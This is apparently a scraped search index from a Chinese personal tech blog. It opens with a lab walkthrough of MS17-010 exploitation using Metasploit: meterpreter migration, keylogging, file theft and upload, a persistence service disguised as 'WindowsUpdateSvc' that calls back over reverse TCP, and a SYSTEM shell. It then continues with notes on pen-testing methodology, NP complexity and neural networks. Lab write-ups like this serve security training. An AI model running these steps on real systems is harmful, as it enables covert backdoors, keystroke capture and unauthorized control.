svchost.ex x64 0 NT AUTHORITY\\SYS e TEM 868 484 svchost.ex x64 0 NT AUTHORITY\\SYS e TEM 988 484 svchost.ex x64 0 NT AUTHORITY\\NET e WORK SERVICE 1052 484 spoolsv.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\System e TEM 32\\spoolsv.exe 1072 484 svchost.ex x64 0 NT AUTHORITY\\LOC e AL SERVICE 1168 484 svchost.ex x64 0 NT AUTHORITY\\LOC e AL SERVICE 1192 484 wmpnetwk.e x64 0 NT AUTHORITY\\NET xe WORK SERVICE 1368 2012 explorer.e x64 1 Ankh-PC\\Ankh C:\\Windows\\Explor xe er.EXE 1420 484 sppsvc.exe x64 0 NT AUTHORITY\\NET WORK SERVICE 1656 484 svchost.ex x64 0 NT AUTHORITY\\LOC e AL SERVICE 1692 484 svchost.ex x64 0 NT AUTHORITY\\NET e WORK SERVICE 1760 1368 taskmgr.ex x64 1 Ankh-PC\\Ankh C:\\Windows\\system e 32\\taskmgr.exe 1916 484 svchost.ex x64 0 NT AUTHORITY\\SYS e TEM 1960 484 taskhost.e x64 1 Ankh-PC\\Ankh C:\\Windows\\system xe 32\\taskhost.exe 2028 836 dwm.exe x64 1 Ankh-PC\\Ankh C:\\Windows\\system 32\\Dwm.exe 2308 1136 cmd.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\cmd.exe 2316 344 conhost.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\system e TEM 32\\conhost.exe 2468 1136 cmd.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\cmd.exe 2476 344 conhost.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\system e TEM 32\\conhost.exe 2716 1136 cmd.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\cmd.exe 2724 344 conhost.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\system e TEM 32\\conhost.exe 2920 1136 cmd.exe x64 0 NT AUTHORITY\\SYS C:\\Windows\\system TEM 32\\cmd.exe 2928 344 conhost.ex x64 0 NT AUTHORITY\\SYS C:\\Windows\\system e TEM 32\\conhost.exe 3044 1368 notepad.ex x64 1 Ankh-PC\\Ankh C:\\Windows\\system e 32\\NOTEPAD.EXE meterpreter \u0026gt; migrate 1368 # 迁移到用户进程从而提取到用户权限 [*] Migrating from 1052 to 1368... [*] Migration completed successfully. meterpreter \u0026gt; getuid # 当前权限为Ankh Server username: Ankh-PC\\Ankh meterpreter \u0026gt; keyscan_start # 开始键盘嗅探 Starting the keystroke sniffer ... meterpreter \u0026gt; keyscan_dump # 打印“Hello？” Dumping captured keystrokes... \u0026lt;Shift\u0026gt;Hello\u0026lt;Shift\u0026gt;? meterpreter \u0026gt; keyscan_stop # 结束键盘嗅探 Stopping the keystroke sniffer... meterpreter \u0026gt; PS：切换到用户身份之后一般很难提升到SYSTEM权限（Windows安全机制），如果尝试getsystem无果，则background -\u0026gt; run重新执行exploit\n3. 文件窃取与上传 下载上一步中靶机桌面保存的hello.txt文件并上传一个hi.txt文件（可以是可执行的恶意程序）\n1 2 3 4 5 meterpreter \u0026gt; cat C:\\\\Users\\\\Ankh\\\\Desktop\\\\hello.txt # 文件读取 Hello?meterpreter \u0026gt; download C:\\\\Users\\\\Ankh\\\\Desktop\\\\hello.txt /home/kali/Desktop # 把文件下载到Kali桌面 [*] Downloading: C:\\Users\\Ankh\\Desktop\\hello.txt -\u0026gt; /home/kali/Desktop/hello.txt [*] Downloaded 6.00 B of 6.00 B (100.0%): C:\\Users\\Ankh\\Desktop\\hello.txt -\u0026gt; /home/kali/Desktop/hello.txt [*] Completed : C:\\Users\\Ankh\\Desktop\\hello.txt -\u0026gt; /home/kali/Desktop/hello.txt 1 2 ┌──(kali㉿kali)-[~/Desktop] └─$ echo \u0026#34;Hi\\!\u0026#34; \u0026gt; hi.txt # Kali终端创建文件 1 2 3 meterpreter \u0026gt; upload /home/kali/Desktop/hi.txt \u0026gt; C:\\\\Users\\\\Ankh\\\\Desktop\\\\ # 上传文件 [*] Uploading : /home/kali/Desktop/hi.txt -\u0026gt; C:\\Users\\Ankh\\Desktop\\hi.txt [*] Completed : /home/kali/Desktop/hi.txt -\u0026gt; C:\\Users\\Ankh\\Desktop\\hi.txt 三、Metasploit持久化后门攻击 利用Windows服务机制实现权限维持 Kali通过MS17-010漏洞获得靶机SYSTEM权限会话后，使用persistence_service模块创建持久化后门 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # 终端1：攻击配置： msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; use exploit/windows/local/persistence_service # 持久化服务模块 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/local/persistence_service) \u0026gt; set payload windows/meterpreter/reverse_tcp # 将攻击载荷设置为32位（默认），64位会出现不兼容情况 msf6 exploit(windows/local/persistence_service) \u0026gt; set SESSION 1 # 设置为当前获取到SYSTEM权限的会话ID。可以通过sessions指令查看 SESSION =\u0026gt; 1 msf6 exploit(windows/local/persistence_service) \u0026gt; set LHOST 10.0.0.223 # 设置为Kali IP LHOST =\u0026gt; 10.0.0.223 msf6 exploit(windows/local/persistence_service) \u0026gt; set LPORT 4446 # 指定一个监听端口 LPORT =\u0026gt; 4446 msf6 exploit(windows/local/persistence_service) \u0026gt; set SERVICE_NAME WindowsUpdateSvc SERVICE_NAME =\u0026gt; WindowsUpdateSvc # 将服务名伪装 payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(windows/local/persistence_service) \u0026gt; run #执行 [*] Started reverse TCP handler on 10.0.0.223:4446 [*] Running module against ANKH-PC [+] Meterpreter service exe written to C:\\Windows\\TEMP\\keQgBw.exe [*] Creating service WindowsUpdateSvc [*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ANKH-PC_20251231.0748/ANKH-PC_20251231.0748.rc [*] Sending stage (177734 bytes) to 10.0.0.17 [*] Meterpreter session 2 opened (10.0.0.223:4446 -\u0026gt; 10.0.0.17:49159) at 2025-12-31 09:07:49 +0000 PS：由于该模块创建了一个持久化服务并且立刻启动了该服务，因此该服务会主动向攻击机发起连接。因此启动该模块后立刻创建了一个新的会话（session 2）。两个会话的权限相同\n创建监听器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 终端2：监听配置 msf6 \u0026gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp # 与攻击配置一致 payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set LHOST 10.0.0.223 # 绑定攻击机IP LHOST =\u0026gt; 10.0.0.223 msf6 exploit(multi/handler) \u0026gt; set LPORT 4446 # 绑定监听端口 LPORT =\u0026gt; 4446 msf6 exploit(multi/handler) \u0026gt; set ExitOnSession false # 即使断开也保持监听 ExitOnSession =\u0026gt; false msf6 exploit(multi/handler) \u0026gt; run -j # -j为后台运行 [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 10.0.0.223:4446 msf6 exploit(multi/handler) \u0026gt; 重启靶机 1 2 3 4 # 终端1：（重启靶机，无需登录）原会话断开 [*] 10.0.0.17 - Meterpreter session 1 closed. Reason: Died [*] 10.0.0.17 - Meterpreter session 2 closed. Reason: Died 靶机自动连接监听器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # 终端2：监听到新的会话连接（SYSTEM权限） [*] Sending stage (177734 bytes) to 10.0.0.17 [*] Meterpreter session 1 opened (10.0.0.223:4446 -\u0026gt; 10.0.0.17:49205) at 2025-12-31 09:09:46 +0000 msf6 exploit(multi/handler) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86/win NT AUTHORITY\\SYSTEM 10.0.0.223:4446 -\u0026gt; 1 dows @ ANKH-PC 0.0.0.17:49205 (10.0 .0.17) msf6 exploit(multi/handler) \u0026gt; sessions -i 1 [*] Starting interaction with 1... meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter \u0026gt; 相关原理 持久化机制： 生成meterpreter后门程序 → C:\\Windows\\TEMP\\keQgBw.exe 创建Windows服务 → \u0026ldquo;WindowsUpdateSvc\u0026rdquo; 配置服务自动启动（开机自启） 服务指向后门程序路径 服务伪装技巧： 服务名伪装：使用WindowsUpdateSvc这样的合法名称，避免被轻易发现 文件路径：存放在C:\\Windows\\TEMP\\，利用系统目录降低怀疑 权限继承：服务以SYSTEM权限运行，维持高权限访问 网络通信机制 反向连接：靶机主动连接攻击机（10.0.0.223:4446） 优势：可绕过出站防火墙限制（大多数防火墙允许出站连接） 稳定性：即使连接断开也会尝试重连 四、Shell 在meterpreter下执行shell可以SYSTEM身份进入靶机终端。由于编码问题（Windows终端采用GBK编码，而Kali终端采用UTF-8编码）shell后可能出现乱码，可以通过指令修改靶机编码方式（chcp 65001，Windows命令提示符(cmd)中设置代码页(Code Page)的命令）以解决该问题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 meterpreter \u0026gt; shell Process 1028 created. Channel 2 created. Microsoft Windows [�汾 6.1.7600] ��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ���� C:\\Windows\\system32\u0026gt;chcp 65001 chcp 65001 Active code page: 65001 # 936对应GBK，65001对应UTF-8 C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt;cd C:\\Users\\Ankh\\Desktop cd C:\\Users\\Ankh\\Desktop C:\\Users\\Ankh\\Desktop\u0026gt;tree /f tree /f Folder PATH listing Volume serial number is 000001BD 0014:5107 C:. Hello.txt hi.txt No subfolders exist C:\\Users\\Ankh\\Desktop\u0026gt;type Hello.txt type Hello.txt Hello? C:\\Users\\Ankh\\Desktop\u0026gt;exit exit meterpreter \u0026gt; ","date":"2025-12-30T16:23:12+08:00","image":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_hu_b85629e489f8903d.png","permalink":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","title":"【攻防实践】MS17-010漏洞利用"},{"content":"渗透测试基础 概述：通过各种手段对目标进行渗透攻击，通过渗透来测试目标的安全防护能力 底层基础：目标系统中存在安全漏洞（Loophole，指信息系统中存在的缺陷或不适当的配置，其可使攻击者在未授权情况下访问或破坏系统，导致信息系统面临安全风险） 渗透代码（Exploit）：利用安全漏洞来造成入侵或破坏效果的程序或者漏洞利用代码 测试分类 黑盒测试 概念： 测试人员在完全不了解目标系统内部结构、源代码、网络拓扑、技术栈等信息的情况下进行测试。他们仅拥有一个公开的访问点（例如一个网站URL或公司名称）。 信息来源： 完全依赖公开信息收集，如搜索引擎、Whois查询、社交媒体、公开端口扫描等。 优点： 模拟真实攻击： 最接近恶意黑客的真实攻击场景。 测试外部防御： 能有效评估边界安全防护（如防火墙、WAF）和暴露在外的服务的安全性。 关注业务逻辑漏洞： 更容易从用户视角发现业务逻辑缺陷。 缺点： 效率较低： 需要大量时间进行信息收集和摸索，可能无法覆盖深层次漏洞。 覆盖面有限： 很难在有限时间内测试到所有内部接口和路径，可能遗漏隐藏漏洞。 深度不足： 难以发现由糟糕的代码实现、错误的配置等引起的深层安全问题。 适用场景： 外部网络渗透测试、红队演练、模拟APT攻击、对已上线系统进行外部风险评估。 白盒测试 概念： 测试人员在拥有目标系统全部或近乎全部信息的情况下进行测试。这通常包括源代码、架构设计文档、网络拓扑图、数据库 schema、API接口文档，甚至开发团队的直接沟通。 信息来源： 客户或开发团队提供的所有内部资料。 优点： 全面深入： 可以系统性地审查所有代码路径、配置和接口，漏洞发现率最高。 效率极高： 无需猜测和盲目探测，可直接定位可能存在问题的代码模块。 发现根源问题： 不仅能找到漏洞，还能精准定位漏洞的代码行和根本原因，便于修复。 早期介入： 可以在开发阶段（如SAST，静态应用安全测试）或上线前进行。 缺点： 不模拟真实攻击： 无法评估系统在外部攻击者视角下的真实表现。 可能忽略配置漏洞： 过于关注代码，可能忽略运行时环境、网络配置等导致的问题。 依赖测试人员技术深度： 需要测试人员具备很强的代码审计和架构理解能力。 适用场景： 代码安全审计、SDL（安全开发生命周期）中的安全测试、内部安全评估、对特定复杂应用进行深度检查。 灰盒测试 概念： 介于黑盒与白盒之间。测试人员拥有部分、有限的内部信息。例如，一个低权限的用户账号、部分API文档、系统使用的技术框架信息，或者基本的网络架构图。 信息来源： 客户提供有限信息 + 测试人员自身信息收集。 优点： 平衡效率与真实性： 在模拟一定真实攻击的同时，利用有限信息提高测试的深度和效率。 聚焦特权升级： 非常适合测试从低权限用户到高权限（垂直越权）或跨用户访问（水平越权）的漏洞。 评估内部威胁： 模拟内部员工或供应链攻击的场景。 缺点： 范围难以界定： 提供多少信息算“灰盒”需要与客户事先清晰约定。 可能遗漏两方面问题： 既可能不如白盒全面，也可能不如黑盒真实。 适用场景： 最常见的渗透测试类型。适用于大多数需要对已上线系统进行内部和外部综合评估的项目，如Web应用渗透测试、移动应用测试（已知部分后端API）。 目标分类 主机操作系统渗透 ​\t如Windows、Solaris、AIX、Linux、SCO、SGI等操作系统本身进行渗透测试\n数据库系统渗透 ​\t对MS-SQL、Oracle、MySQL、Informix、Sybase、DB2、Access等数据库应用系统进行渗透测试\n应用系统渗透 ​\t对渗透目标提供的各种应用，如ASP、CGI、JSP、PHP等组成的WWW应用进行渗透测试\n网络设备渗透 ​\t对各种防火墙、入侵检测系统、网络设备进行渗透测试\n渗透测试过程环节 前期交互阶段（Pre-Engagement Interaction）\n情报搜集阶段（Information Gathering）\n威胁建模阶段（Threat Modeling）\n漏洞分析阶段（Vulnerability Analysis）\n渗透攻击阶段（Exploitation）\n后渗透攻击阶段（Post Exploitation）\n报告阶段（Reporting）\n1. 前期交互阶段 正式测试开始前的规划和约定阶段，旨在明确测试的范围、规则和目标，确保测试合法、有效且可控。\n核心活动： 确定范围：与客户共同商定哪些系统、网络、应用程序或IP地址可以测试，哪些是绝对禁止的（如生产数据库、客户数据等）。 确定规则：定义测试方法（黑盒、白盒还是灰盒）、攻击强度（是否允许造成服务中断、社会工程攻击等）、测试时间窗口（是否只能在非工作时间进行）。 法律授权：签署渗透测试授权书，这是最重要的法律文件，确保测试行为合法，保护测试方和客户。 确定目标：明确测试的最终目的是什么（如：验证特定防火墙策略、评估新上线的Web应用安全、满足合规性要求等）。 输出物：授权书、范围定义文档、沟通计划。 2. 情报搜集阶段 “信息收集”，是测试的基石。尽可能多地收集关于目标的各种信息，为后续攻击寻找入口。情报分为两类：\n被动情报搜集：在不与目标系统直接交互的情况下，通过公开渠道获取信息。例如：搜索引擎、社交媒体、Whois域名信息、DNS记录、公开的代码仓库、新闻稿等。 主动情报搜集：通过与目标系统直接交互来获取信息，但可能被记录。例如：端口扫描、服务指纹识别、网络拓扑探测等。 关键目标：发现目标的所有网络资产、域名、子域名、IP地址、开放端口、运行的服务版本、员工信息、技术栈等。 3. 威胁建模阶段 对收集到的信息进行分析和提炼，识别出可能被利用的资产、潜在的安全漏洞和攻击路径。这是一个分析规划阶段。\n核心活动： 资产识别：梳理出高价值的攻击目标（如数据库服务器、文件服务器、Web应用后台）。 攻击面分析：分析目标暴露的所有可能被攻击的点（如开放的远程管理端口、未认证的Web API、过时的框架）。 攻击向量规划：基于情报，构思可能的攻击路径和方法。例如：“通过钓鱼邮件获取员工凭证 -\u0026gt; 登录VPN -\u0026gt; 利用内部文件服务器的漏洞获取域控权限”。 工具与技术选择：根据分析结果，准备下一阶段所需的漏洞扫描工具、攻击载荷等。 4. 漏洞分析阶段 对已识别的攻击面进行深入探测，以发现和验证具体的安全漏洞。\n核心活动： 自动化扫描：使用Nessus、Nexpose、AWVS等漏洞扫描器进行系统性扫描，生成初步漏洞报告。 手动验证与分析：这是体现测试人员技术的关键。对扫描器报告的结果进行去误报、分析漏洞的可利用性和实际风险等级。扫描器找不到的逻辑漏洞、业务逻辑缺陷、配置错误等，需要在此阶段通过手动测试发现。 漏洞优先级排序：根据CVSS分数、利用难度、对业务的影响等因素，对漏洞进行排序，决定后续攻击的优先级。 5. 渗透攻击阶段 这是模拟真实攻击者的核心环节，尝试利用已发现的漏洞来突破安全防线，获取对系统或数据的未授权访问。\n核心活动： 漏洞利用：使用Metasploit、定制化的EXP或手动攻击方式，利用漏洞获取初始访问权限。例如：利用SQL注入获取数据库数据、利用文件上传漏洞上传Webshell、利用缓冲区溢出漏洞获取系统Shell。 突破边界：成功从一个外部点（如Web服务器）攻入内部网络。 权限提升：在已控制的主机上，从普通用户权限提升为管理员/系统权限。 关键点：此阶段需要谨慎操作，避免对目标系统造成意外损害。 6. 后渗透攻击阶段 在成功渗透进入目标系统后，模拟高级持续性威胁的攻击行为，目标是展示漏洞被利用后可能造成的实际业务影响。\n核心活动： 权限维持：在目标系统上安装后门、创建隐藏账户等，以维持长期控制。 横向移动：以已控制的机器为跳板，探测和攻击内网中的其他重要主机（如数据库服务器、域控制器）。 目标达成：窃取或篡改敏感数据（在授权范围内）、完全控制核心系统、访问关键业务功能等，以证明漏洞的严重性。 足迹清理：根据测试规则，可能需要清除测试过程中留下的日志、工具等痕迹（模拟真实攻击者），也可能保留用于报告证据。 7. 报告阶段 将整个测试过程、发现、影响和建议以清晰、专业的形式呈现给客户，这是渗透测试价值最终交付的体现。\n报告内容： 执行摘要：用非技术语言向管理层阐述测试概述、发现的高风险问题及其对业务的潜在影响。 技术细节：详细描述每个漏洞的发现过程（步骤、截图）、原理、影响范围和修复建议。这部分是给技术人员看的。 风险评级：对每个漏洞进行严重程度评级（如高、中、低）。 修复建议：提供具体、可操作的修复方案或缓解措施。 附录：可能包含工具输出、日志片段等证据材料。 渗透实践-Metasploit开源的渗透测试框架 Exploit（渗透攻击）：渗透攻击是指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。流行的渗透攻击技术包括缓冲区溢出、WEB应用程序漏洞攻击（SQL注入、XSS等），以及利用配置错误等 **Palyload（攻击载荷）**攻击载荷是我们期望目标系统在被渗透攻击之后执行的代码。在Metasploit框架中可以自由选择、传送和植入 ShellCode：SellCode是渗透攻击时作为攻击载荷运行的一组机器指令，通常用汇编语言编写 Module（模块）：Metasploit中一个模块是指Metasploit框架中所使用的一段软件代码组件 Listener（监听器）：监听器是Metasploit中用来等待接入网络连接主机的组件 ","date":"2025-12-30T14:51:56+08:00","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/","title":"渗透测试基础"},{"content":" 目录 几类问题 P类问题(polynomial) NP类问题（Nondeterministic polynomial） NPC问题（NP完全问题） NP-Hard问题（NP难问题） 关系与比较 归约性 NP问题与归约 几类问题 P类问题(polynomial) 定义：可以在多项式时间内被确定性图灵机解决的问题 时间复杂度：多项式时间，如 $ O(n) $ , $ O(n\\log n) $ , $ O(n^3 $ )等等 经典问题：小数背包问题、搜索、排序、Dijkstra、AKS算法等 NP类问题（Nondeterministic polynomial） 定义：给定一个证书（certification），可以在多项式时间内验证此证书是否是问题的一个解。只保证在多项式时间内能够验证解的准确性，而无法保证可解。 例如：哈密顿回路问题、TSP问题、SAT问题等 P类问题一定是NP类问题，NP类问题不一定是P类问题 NPC问题（NP完全问题） 定义： 本身是NP问题（可快速验证解） 所有的NP问题都可以转换成此问题。即：所有的NP问题都可以在多项式时间内归约（reducibility）成此问题 例如：3-SAT、顶点覆盖、团问题、子集和问题等 对于最优化的验证问题（例如旅行商问题），可以转化为一个判断问题 NP-Hard问题（NP难问题） 定义：至少和NPC问题一样难，但不一定属于NP问题。即所有NP问题都能归约到它，但其本身不一定是NP问题。\n例如：TSP、围棋必胜策略、停机问题等\n关系与比较 问题类型 是否快速求解 是否快速验证 是否所有NP可归约 典型例子 P ✅ ✅ ❌ 排序 NP ❓（未知） ✅ ❌ TSP验证 NPC ❓（未知） ✅ ✅ 3-SAT NPH ❌（更难） ❌（可能） ✅ TSP优化 1 2 3 4 5 6 7 8 9 10 11 graph TB subgraph NP-Hard direction TB subgraph NP direction TB subgraph NPC end subgraph P end end end 归约性 一个问题（ $ Q_1 $ ）可以归约为另外一个问题（ $ Q_2 $ ）： $ Q_1 $ 可以转换为 $ Q_2 $ ，之后可以通过求解 $ Q_2 $ 的方法来求解 $ Q_1 $ 简单的比喻：求解一元一次方程可归约为求解一元二次方程（二次项系数为0） 定义：一个问题（ $ Q_1 $ ）可以归约为另外一个问题（ $ Q_2 $ ）需满足： 实例对应性：$ Q_1 $ 得任意一个实例 $ \\phi $ ，通过函数 $ f $ 都可转化成 $ Q_2 $ 的一个实例 $ f(\\phi) $ ，且这个转化函数 $ f $ 必须为多项式时间 输出一致性：归约后的输出和原来的输出一致，即，如 $ algo_1 $ 是 $ Q_1 $ 的算法， $ algo_2 $ 是 $ Q_2 $ 的算法，则在相同的输入下， $ algo_1(Q_1)=algo_2(Q_2) $ 归约的传递性：如果问题 $\\mathcal{A}$ 可归约为问题 $\\mathcal{B}$ ，问题B可归约为问题 $\\mathcal{C}$ ，则问题 $\\mathcal{A}$ 可归约为问题 $\\mathcal{C}$ ","date":"2025-12-06T15:19:03+08:00","permalink":"http://localhost:1313/p/np%E9%97%AE%E9%A2%98%E4%B8%8E%E5%BD%92%E7%BA%A6/","title":"NP问题与归约"},{"content":" 目录 前馈神经网络（FNN） 神经元 神经网络结构 神经网络结构模型搭建 损失函数 二分类任务——二元交叉熵损失（Sigmoid损失） 多分类任务——多元交叉熵损失（Softmax损失） 回归损失——MAE损失函数（L1范数/曼哈顿距离） 回归损失——MSE损失函数（L2范数/欧氏距离） 回归损失——Smooth L1损失函数（L1与L2的结） 反向传播与梯度下降 反向传播 梯度下降 正则化 Dropout正则化 BN层（小批量归一化） 实践——手机价格分类预测 导入工具包 数据加载 构建模型 模型训练 模型评估 程序入口 实践（改进）——手机价格分类预测 工具导入 数据加载 模型构建 模型训练 模型评估 函数入口 卷积神经网络（CNN） 图像基础 卷积神经网络结构 卷积层：特征提取 池化层 实践 —— CCN实现图片分类 导入工具 数据导入 模型构建 模型训练 模型评估 程序入口 循环神经网络（RNN） 自然语言处理基础 文本处理与RNN网络 词嵌入层 RNN 词表生成 神经网络（Neural Network，NN） 前馈神经网络（FNN） 神经元 数学模型：$$output = f(b+\\displaystyle{\\sum_{i=1}^nx_iw_i})$$，其中 $f(x)$ 为非线性的激活函数（Activation Function）; $n$ 为输入样本的特征数量 激活函数 Sigmoid: $$f(x) = \\displaystyle{\\frac{1}{1+e^{-x}}}$$ 优点：可微、有界、单调、直观 缺点：梯度消失、恒为正、饱和区 Tanh： $$\\displaystyle{f(x)=\\frac{1-e^{-2x}}{1+e^{-2x}}}$$ 优点：零均值、导数幅度大、可微 缺点：梯度消失、饱和区 ReLU： $$f(x)=\\max(0,x)$$ 优点：无梯度消失、计算极简、稀疏激活、收敛更快、无界输出 缺点：神经元永久关闭、非0对称、不可微点0、对噪声敏感 ReLU扩展： PReLU： $$ f(x;\\alpha) = \\begin{cases} \\alpha x,\\ \u0026x\u003c0 \\\\ \\ x, \u0026x \\ge 0 \\end{cases} $$ ELU: $$ f(x;\\alpha) = \\begin{cases} \\alpha(e^x-1),\\ \u0026x\u003c0 \\\\ \\ x, \u0026x \\ge 0 \\end{cases} $$ Softmax： $f_i(x) = \\displaystyle{\\frac{e^{x_i}}{\\sum_{j=1}^ke^{z_j}}}$ Sigmoid常用于二分类任务的单输出结点，代表概率 Softmax常用于多分类任务的k个输出节点，代表概率 求导：$$\\displaystyle{\\frac{\\partial Out(w)}{\\partial w}=\\frac{\\partial Out(w)}{\\partial In(w)}\\frac{\\partial In(w)}{\\partial w} = \\frac{d f(In)}{d In}\\frac{\\partial In(w)}{\\partial w}}$$ 图示： 神经网络结构 MLP结构：（神经元串联） 输入层（Input Layer） 输入层共有n个结点（n为特征数） 每个输入结点为所有样本的某一个特征值，m行1列（m为样本数） 隐藏层（Hidden Layer） MLP中神经元之间为全连接 每个连接都有一个权重值 输出层（Output Layer） 超参数 隐藏层的层数 每个隐藏层的神经元个数 参数初始化 均匀分布初始化参数：从 $$\\displaystyle{(-\\frac{1}{\\sqrt d},\\frac{1}{\\sqrt{d}})}$$，其中 d 为每个神经元的输入数量 1 nn.init.uniform_(linear.weight) 正态分布初始化参数：从标准正态随机取值 1 nn.init.normal_(linear.weight, mean=0, std=1) 全0初始化参数 1 nn.init.zeros_(linear.weight0) 全1初始化参数 1 nn.init.ones_(linear.weight0) 固定值初始化参数 KaiMing初始化（HE初始化） 正态HE初始化： $$\\displaystyle{\\mathcal{N}\\left(0,\\sqrt{\\frac{2}{in\\_dim}}\\right)}$$ 1 nn.init.kaiming_normal_(linear.weight) 均匀分布HE初始化：$$\\displaystyle{\\mathcal{U}\\left(-\\sqrt{\\frac{6}{in_dim}},+\\sqrt{\\frac{6}{in_dim}}\\right)}$$ 1 nn.init.kaiming_uniform_(linear.weight) Xavier初始化（Glorot初始化） 正态Glorot初始化（默认）： $$\\displaystyle{\\mathcal{N}\\left(0,\\sqrt{\\frac{2}{in\\_dim+out\\_dim}}\\right)}$$ 1 nn.init.xavier_normal_(linear.weight) 均匀Glorot初始化： $$\\displaystyle{\\mathcal{U}\\left(-\\sqrt{\\frac{6}{in_dim+out_dim}},+\\sqrt{\\frac{6}{in_dim+out_dim}}\\right)}$$ 1 nn.init.xavier_uniform_(linear.weight) 反向传播：链式求导：Loss函数对所有参数求导 图示：（构建如下） 在线可视化神经网络：Neural Network Playground 神经网络结构模型搭建 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import torch import torch.nn as nn from torchviz import make_dot from torchsummary import summary class Model(nn.Module): def __init__(self): super(Model,self).__init__() # 调用父类初始化方法 self.in_h1_linear = nn.Linear(4,5) # 输入层到第一隐藏层 # nn.init.xavier_normal_(self.in_h1_linear.weight) # 初始化方法，不用写 self.h1_h2_linear = nn.Linear(5,4) # 第一隐藏层到第二隐藏层 # nn.init.kaiming_normal_(self.h1_h2_linear.weight) self.h2_out_linear = nn.Linear(4,3) # 第二隐藏层到输出层 # nn.init.normal_(self.h2_out_linear.weight) def forward(self,x): x = self.in_h1_linear(x) # 到达第一隐藏层 x = torch.sigmoid(x) # Sigmoid激活函数 x = self.h1_h2_linear(x) # 到达第二隐藏层 x = torch.relu(x) # ReLU激活函数 x = self.h2_out_linear(x) # 到达输出层 return torch.softmax(x,dim=-1) # 在输出层通过Softmax概率化输出（如果是多分类任务） if __name__==\u0026#34;__main__\u0026#34;: # 定义模型 model = Model() # 参数量统计 summary(model,input_size=(4,),batch_size=520,device=\u0026#39;cpu\u0026#39;) # 参数打印 for name,params in model.named_parameters(): print(name,params) # 计算图绘制 # y = model(torch.tensor([1,2,3,4],dtype=torch.float32)) # dot = make_dot(y,params=dict(model.named_parameters())) # print(dot) ---------------------------------------------------------------- Layer (type) Output Shape Param # ================================================================ Linear-1 [520, 5] 25 Linear-2 [520, 4] 24 Linear-3 [520, 3] 15 ================================================================ Total params: 64 Trainable params: 64 Non-trainable params: 0 ---------------------------------------------------------------- Input size (MB): 0.01 Forward/backward pass size (MB): 0.05 Params size (MB): 0.00 Estimated Total Size (MB): 0.06 ---------------------------------------------------------------- in_h1_linear.weight Parameter containing: tensor([[-0.1587, -0.1239, 0.4235, 0.3390], [-0.0211, -0.4489, -0.0343, -0.0293], [ 0.4945, 0.1847, -0.2413, -0.1682], [-0.0767, -0.0808, -0.0054, 0.4703], [ 0.4768, 0.4413, -0.2241, -0.2929]], requires_grad=True) in_h1_linear.bias Parameter containing: tensor([ 0.3772, 0.1606, -0.4499, 0.3997, -0.2885], requires_grad=True) h1_h2_linear.weight Parameter containing: tensor([[ 0.3114, 0.1786, -0.2437, 0.1051, -0.3297], [ 0.2338, 0.4141, 0.3638, -0.1816, 0.1560], [-0.1107, -0.1953, -0.0770, -0.0711, -0.1429], [-0.3616, -0.2039, -0.3213, -0.0980, -0.3732]], requires_grad=True) h1_h2_linear.bias Parameter containing: tensor([0.0112, 0.3500, 0.1824, 0.0403], requires_grad=True) h2_out_linear.weight Parameter containing: tensor([[ 0.4316, -0.1131, -0.4884, -0.1070], [-0.4599, -0.1800, -0.4684, -0.0996], [-0.3372, -0.1655, -0.3222, 0.2816]], requires_grad=True) h2_out_linear.bias Parameter containing: tensor([0.3777, 0.2212, 0.3185], requires_grad=True) 损失函数 二分类任务——二元交叉熵损失（Sigmoid损失） 损失函数： $$\\displaystyle{\\mathcal{L}=-y\\log \\hat y - (1-y)\\log(1-\\hat y)}$$ $ y_i $（采用 $One-Hot$ 编码）是第 $ i $ 条样本 $ x_i $ 对应的真实标签（共 $ m $ 条样本） $\\hat{y}$ 是模型预测值 $\\hat{y} = \\sigma(f_\\theta(x_i))$ $ \\sigma(·) $ 是 $ Sigmoid $ 函数，将模型输出转换为概率 $ \\mathcal{L} $ 用来衡量真实值 $ y $ 与预测值 $ f_\\theta(x) $ 之间的差异性损失 Pytorch: torch.nn.BCELoss() 多分类任务——多元交叉熵损失（Softmax损失） 损失函数：$$\\mathcal{L} = \\displaystyle{-\\sum_{i=1}^my_i\\log(\\operatorname{S}(f_\\theta(x_i)))}$$ $ y_i $（采用 $One-Hot$ 编码）是第 $ i $ 条样本 $ x_i $ 对应的真实标签（共 $ m $ 条样本） $ f_\\theta(x_i) $ 